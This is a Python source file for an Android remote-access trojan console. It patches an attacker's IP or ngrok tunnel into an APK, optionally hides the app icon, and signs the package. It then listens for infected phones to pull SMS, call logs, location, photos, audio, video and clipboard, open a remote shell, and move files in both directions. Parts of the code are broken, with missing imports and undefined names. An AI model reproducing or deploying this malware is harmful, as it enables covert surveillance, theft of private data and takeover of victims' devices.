import sys
import os
import base64
import time
import binascii
import select
import pathlib
import platform
import re
from subprocess import PIPE, run
import socket
import threading
import itertools
import queue
import cryptography
from cryptography.fernet import Fernet
import ssl



class SecureConnection:
    def __init__(self, key):
        self.cipher = Fernet(key)
    
    def encrypt(self, data):
        return self.cipher.encrypt(data.encode())
    
    def decrypt(self, data):
        return self.cipher.decrypt(data).decode()

def create_self_signed_cert():
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    
    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "IR"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Br"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, "Doholkoo"),
    ])
    
    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.now(datetime.timezone.utc)
    ).not_valid_after(
        datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365)
    ).add_extension(
        x509.SubjectAlternativeName([x509.DNSName("localhost")]),
        critical=False,
    ).sign(key, hashes.SHA256())
    
    return key, cert

def enhanced_shell(client, secure_conn):
    while True:
        try:
            encrypted_data = client.recv(4096)
            if not encrypted_data:
                break
                
            msg = secure_conn.decrypt(encrypted_data)
            
            if msg.startswith("file_upload:"):
                filename, content = msg.split(":", 2)[1:]
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(content))
                response = f"File {filename} uploaded successfully"
                
            elif msg.startswith("file_download:"):
                filename = msg.split(":", 1)[1]
                try:
                    with open(filename, "rb") as f:
                        content = base64.b64encode(f.read()).decode()
                    response = f"file_content:{content}"
                except Exception as e:
                    response = f"error:{str(e)}"
                    
            else:
                try:
                    result = subprocess.run(
                        msg, 
                        shell=True, 
                        check=True,
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        timeout=30
                    )
                    response = result.stdout.decode()
                except Exception as e:
                    response = f"error:{str(e)}"
            
            client.send(secure_conn.encrypt(response))
            
        except Exception as e:
            print(f"Shell error: {str(e)}")
            break



def apk_file_builder(file_name, use_ngrok):
    apk_name = file_name
    icon_input = input("Add visible icon? (y/n): ").strip().lower()
    icon = True if icon_input == "y" else None

    if use_ngrok:
        if ngrok is None:
            print(std_output("error") + "Ngrok is not installed.")
            return
        try:
            from pyngrok import conf
            conf.get_default().monitor_thread = False
            port = "8000"
            tcp_tunnel = ngrok.connect(port, "tcp")
            domain, port = tcp_tunnel.public_url[6:].split(":")
            ip = socket.gethostbyname(domain)
            print(std_output("info") + f"Ngrok Tunnel IP: {ip}, Port: {port}")
            if build:
                build(ip, port, apk_name, True, "8000", icon)
        except Exception as e:
            print(std_output("error") + f"Ngrok error: {str(e)}")
    else:
        ip = input("Enter IP address: ").strip()
        port = input("Enter port: ").strip()
        if not validate_ip(ip) or not validate_port(port):
            print(std_output("error") + "Invalid IP or port.")
            return
        if build:
            build(ip, port, apk_name, False, None, icon)






sys.stdout.reconfigure(encoding='utf-8')
def stdOutput(type_=None):
    if type_ == "error": col = "31m";str = "ERROR"
    if type_ == "warning": col = "33m";str = "WARNING"
    if type_ == "success": col = "32m";str = "SUCCESS"
    if type_ == "info": return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
    message = "\033[1m[\033[31m\033[0m\033[1m\033[" + col + str + "\033[0m\033[1m]\033[0m "
    return message


def animate(message):
    chars = "/—\\|"
    for char in chars:
        sys.stdout.write("\r" + stdOutput("info") + "\033[1m" + message + "\033[31m" + char + "\033[0m")
        time.sleep(.1)
        sys.stdout.flush()


def clearDirec():
    if (platform.system() == 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear, direc


clear, direc = clearDirec()
if not os.path.isdir(os.getcwd() + direc + "Dumps"):
    os.makedirs("Dumps")


def is_valid_ip(ip):
    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
    return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))


def is_valid_port(port):
    i = 1 if port.isdigit() and len(port) > 1 else 0
    return i


def execute(command):
    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)


def executeCMD(command, queue):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    queue.put(result)
    return result


def getpwd(name):
    return os.getcwd() + direc + name;


def handle_file_transfer(conn, command):
    if command.startswith("download:"):
        filename = command.split(":",1)[1]
        try:
            with open(filename, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            send_encrypted(conn, f"FILE:{filename}:{data}")
        except Exception as e:
            send_encrypted(conn, f"ERROR:{str(e)}")
    
    elif command.startswith("upload:"):
        parts = command.split(":",2)
        filename, data = parts[1], parts[2]
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(data))
        send_encrypted(conn, "UPLOAD_SUCCESS")


BANNER = r"""
 ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▀█▀▀▄ 
█   █   █ ▐ ▄▀ ▀▄ █    █  ▐ 
▐  █▀▀█▀    █▄▄▄█ ▐   █     
 ▄▀    █   ▄▀   █    █      
█     █   █   ▄▀   ▄▀       
▐     ▐   ▐   ▐   █         
                  ▐         
"""

def show_banner():
    print(BANNER)
    print(f"[*] Platform: {platform.system()} {platform.release()}")
    print(f"[*] Python: {platform.python_version()}")
    print(f"[*] Working Directory: {os.getcwd()}")
    print("-" * 60 + "\n")



def help():
    helper = """
    Usage:
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a interactive shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
    download:[remote_path]     --> Download file from target device (e.g. download:/sdcard/notes.txt)
    upload:[local_path]        --> Upload file to target device (e.g. upload:malware.apk)
    """
    print(helper)


def getImage(client):
    print(stdOutput("info") + "\033[0mTaking Image")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    flag = 0
    filename = "Dumps" + direc + "Image_" + timestr + '.jpg'
    imageBuffer = recvall(client)
    imageBuffer = imageBuffer.strip().replace("END123", "").strip()
    if imageBuffer == "":
        print(stdOutput("error") + "Unable to connect to the Camera\n")
        return
    with open(filename, 'wb') as img:
        try:
            imgdata = base64.b64decode(imageBuffer)
            img.write(imgdata)
            print(stdOutput("success") + "Succesfully Saved in \033[1m\033[32m" + getpwd(filename) + "\n")
        except binascii.Error as e:
            flag = 1
            print(stdOutput("error") + "Not able to decode the Image\n")
    if flag == 1:
        os.remove(filename)


def readSMS(client, data):
    print(stdOutput("info") + "\033[0mGetting " + data + " SMS")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "Dumps" + direc + data + "_" + timestr + '.txt'
    flag = 0
    with open(filename, 'w', errors="ignore", encoding="utf-8") as txt:
        msg = recvall(client)
        try:
            txt.write(msg)
            print(stdOutput("success") + "Succesfully Saved in \033[1m\033[32m" + getpwd(filename) + "\n")
        except UnicodeDecodeError:
            flag = 1
            print(stdOutput("error") + "Unable to decode the SMS\n")
    if flag == 1:
        os.remove(filename)


def getFile(filename, ext, data):
    fileData = "Dumps" + direc + filename + "." + ext
    flag = 0
    with open(fileData, 'wb') as file:
        try:
            rawFile = base64.b64decode(data)
            file.write(rawFile)
            print(stdOutput("success") + "Succesfully Downloaded in \033[1m\033[32m" + getpwd(fileData) + "\n")
        except binascii.Error:
            flag = 1
            print(stdOutput("error") + "Not able to decode the Audio File")
    if flag == 1:
        os.remove(filename)


def putFile(filename):
    data = open(filename, "rb").read()
    encoded = base64.b64encode(data)
    return encoded


def shell(client):
    msg = "start"
    command = "ad"
    while True:
        msg = recvallShell(client)
        if "getFile" in msg:
            msg = " "
            msg1 = recvall(client)
            msg1 = msg1.replace("\nEND123\n", "")
            filedata = msg1.split("|_|")
            getFile(filedata[0], filedata[1], filedata[2])

        if "putFile" in msg:
            msg = " "
            sendingData = ""
            filename = command.split(" ")[1].strip()
            file = pathlib.Path(filename)
            if file.exists():
                encoded_data = putFile(filename).decode("UTF-8")
                filedata = filename.split(".")
                sendingData += "putFile" + "<" + filedata[0] + "<" + filedata[1] + "<" + encoded_data + "END123\n"
                client.send(sendingData.encode("UTF-8"))
                print(stdOutput(
                    "success") + f"Succesfully Uploaded the file \033[32m{filedata[0] + '.' + filedata[1]} in /sdcard/temp/")
            else:
                print(stdOutput("error") + "File not exist")

        if "Exiting" in msg:
            print("\033[1m\033[33m----------Exiting Shell----------\n")
            return
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)
        print(" ")
        command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
        command = command + "\n"
        if command.strip() == "clear":
            client.send("test\n".encode("UTF-8"))
            clear()
        else:
            client.send(command.encode("UTF-8"))


def getLocation(sock):
    msg = "start"
    while True:
        msg = recvall(sock)
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)
        if ("END123" in msg):
            return
        print(" ")


def recvall(sock):
    buff = ""
    data = ""
    while "END123" not in data:
        data = sock.recv(4096).decode("UTF-8", "ignore")
        buff += data
    return buff


def recvallShell(sock):
    buff = ""
    data = ""
    ready = select.select([sock], [], [], 3)
    while "END123" not in data:
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8", "ignore")
            buff += data
        else:
            buff = "bogus"
            return buff
    return buff


def stopAudio(client):
    print(stdOutput("info") + "\033[0mDownloading Audio")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data = ""
    flag = 0
    data = recvall(client)
    data = data.strip().replace("END123", "").strip()
    filename = "Dumps" + direc + "Audio_" + timestr + ".mp3"
    with open(filename, 'wb') as audio:
        try:
            audioData = base64.b64decode(data)
            audio.write(audioData)
            print(stdOutput("success") + "Succesfully Saved in \033[1m\033[32m" + getpwd(filename))
        except binascii.Error:
            flag = 1
            print(stdOutput("error") + "Not able to decode the Audio File")
    print(" ")
    if flag == 1:
        os.remove(filename)


def stopVideo(client):
    print(stdOutput("info") + "\033[0mDownloading Video")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data = ""
    flag = 0
    data = recvall(client)
    data = data.strip().replace("END123", "").strip()
    filename = "Dumps" + direc + "Video_" + timestr + '.mp4'
    with open(filename, 'wb') as video:
        try:
            videoData = base64.b64decode(data)
            video.write(videoData)
            print(stdOutput("success") + "Succesfully Saved in \033[1m\033[32m" + getpwd(filename))
        except binascii.Error:
            flag = 1
            print(stdOutput("error") + "Not able to decode the Video File\n")
    if flag == 1:
        os.remove("Video_" + timestr + '.mp4')


def callLogs(client):
    print(stdOutput("info") + "\033[0mGetting Call Logs")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = "Dumps" + direc + "Call_Logs_" + timestr + '.txt'
    if "No call logs" in msg:
        msg.split("\n")
        print(msg.replace("END123", "").strip())
        print(" ")
    else:
        with open(filename, 'w', errors="ignore", encoding="utf-8") as txt:
            txt.write(msg)
            txt.close()
            print(stdOutput("success") + "Succesfully Saved in \033[1m\033[32m" + getpwd(filename) + "\033[0m")
            if not os.path.getsize(filename):
                os.remove(filename)


def get_shell(ip, port):
    soc = socket.socket()
    soc = socket.socket(type=socket.SOCK_STREAM)
    try:
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip, int(port)))
    except Exception as e:
        print(stdOutput("error") + "\033[1m %s" % e);
        exit()

    soc.listen(2)
    print(banner)
    while True:
        que = queue.Queue()
        t = threading.Thread(target=connection_checker, args=[soc, que])
        t.daemon = True
        t.start()
        while t.is_alive(): animate("Waiting for Connections  ")
        t.join()
        conn, addr = que.get()
        clear()
        print("\033[1m\033[33mGot connection from \033[31m" + "".join(str(addr)) + "\033[0m")
        print(" ")
        while True:
            msg = conn.recv(4024).decode("UTF-8")
            if (msg.strip() == "IMAGE"):
                getImage(conn)
            elif ("readSMS" in msg.strip()):
                content = msg.strip().split(" ")
                data = content[1]
                readSMS(conn, data)
            elif (msg.strip() == "SHELL"):
                shell(conn)
            elif (msg.strip() == "getLocation"):
                getLocation(conn)
            elif (msg.strip() == "stopVideo123"):
                stopVideo(conn)
            elif (msg.strip() == "stopAudio"):
                stopAudio(conn)
            elif (msg.strip() == "callLogs"):
                callLogs(conn)
            elif (msg.strip() == "help"):
                help()
            else:
                print(stdOutput("error") + msg) if "Unknown Command" in msg else print(
                    "\033[1m" + msg) if "Hello there" in msg else print(msg)
            message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m") + "\n"
            conn.send(message_to_send.encode("UTF-8"))
            if message_to_send.strip() == "exit":
                print(" ")
                print("\033[1m\033[32m\t (∗ ･‿･)ﾉ゛\033[0m")
                sys.exit()
            if (message_to_send.strip() == "clear"): clear()


def connection_checker(socket, queue):
    conn, addr = socket.accept()
    queue.put([conn, addr])
    return conn, addr


def build(ip, port, output, ngrok=False, ng=None, icon=None):
    editor = "Compiled_apk" + direc + "smali" + direc + "com" + direc + "example" + direc + "reverseshell2" + direc + "config.smali"
    try:
        file = open(editor, "r").readlines()
        file[18] = file[18][:21] + "\"" + ip + "\"" + "\n"
        file[23] = file[23][:21] + "\"" + port + "\"" + "\n"
        file[28] = file[28][:15] + " 0x0" + "\n" if icon else file[28][:15] + " 0x1" + "\n"
        str_file = "".join([str(elem) for elem in file])
        open(editor, "w").write(str_file)
    except Exception as e:
        print(e)
        sys.exit()
    java_version = execute("java -version")
    if java_version.returncode: print(stdOutput("error") + "Java not installed or found");exit()
    print(stdOutput("info") + "\033[0mGenerating APK")
    outFileName = output if output else "karma.apk"
    que = queue.Queue()
    t = threading.Thread(target=executeCMD,
                         args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o " + outFileName, que], )
    t.start()
    while t.is_alive(): animate("Building APK ")
    t.join()
    print(" ")
    resOut = que.get()
    if not resOut.returncode:
        print(stdOutput("success") + "Successfully apk built in \033[1m\033[32m" + getpwd(outFileName) + "\033[0m")
        print(stdOutput("info") + "\033[0mSigning the apk")
        t = threading.Thread(target=executeCMD,
                             args=["java -jar Jar_utils/sign.jar -a " + outFileName + " --overwrite", que], )
        t.start()
        while t.is_alive(): animate("Signing Apk ")
        t.join()
        print(" ")
        resOut = que.get()
        if not resOut.returncode:
            print(stdOutput("success") + "Successfully signed the apk \033[1m\033[32m" + outFileName + "\033[0m")
            if ngrok:
                clear()
                get_shell("0.0.0.0", 8000) if not ng else get_shell("0.0.0.0", ng)
            print(" ")
        else:
            print("\r" + resOut.stderr)
            print(stdOutput("error") + "Signing Failed")
    else:
        print("\r" + resOut.stderr)
        print(stdOutput("error") + "Building Failed")